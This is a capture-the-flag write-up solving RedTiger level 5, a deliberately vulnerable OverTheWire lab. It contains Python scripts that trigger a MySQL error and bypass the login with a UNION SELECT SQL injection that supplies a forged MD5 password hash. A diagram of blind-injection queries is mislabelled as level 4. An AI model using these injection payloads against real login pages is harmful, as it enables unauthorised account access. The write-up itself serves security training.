================================================================================================================
[redtiger] level5
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="level4.php?id=1 and if((select length(keyword) from level4_secret)=%s,1,0)",arrowhead="normal"];
        step3 -> step2[label="column length",arrowhead="normal"];
        step4 -> step5[label="level4.php?id=1 and if((select substring(keyword,%s,1) from level4_secret)=%s,1,0)",arrowhead="normal"];
        step7 -> step6[label="@solve",arrowhead="normal"];
    }

|

Source Analysis
================================================================================================================

- Target: Bypass the login
- Disabled: substring , substr, ( , ), mid
- Hints: its not a blind, the password is md5-crypted, watch the login errors

.. code-block:: html

    <form name="login" action="?mode=login" method="POST">
        Username: <input name="username" size="30" type="text">
        Password: <input name="password" size="30" type="text">
    <input name="login" value="Login" type="submit">
    </form>


|

Error Page
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level5.php"
    cookies = {
        "level5login":"bananas_are_not_yellow-sometimes"
    }

    params = {
        "username": "'",
        "password": "'"
    }
    
    r = requests.post(url, cookies=cookies, params=params, verify=False)
    print r.content

|

.. code-block:: html

    Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/hackit/level5.php on line 46
    User not found!

|

Data Extract
================================================================================================================


.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level5.php"
    cookies = {
        "level5login":"bananas_are_not_yellow-sometimes"
    }

    params = {
        "mode": "login"
    }

    # a => 0cc175b9c0f1b6a831c399e269772661
    payloads = {
        "username": "' union select 'joizel', '0cc175b9c0f1b6a831c399e269772661",
        "password": "a",
        "login": "Login"
    }

    r = requests.post(url, cookies=cookies, params=params, data=payloads, verify=False)
    print r.content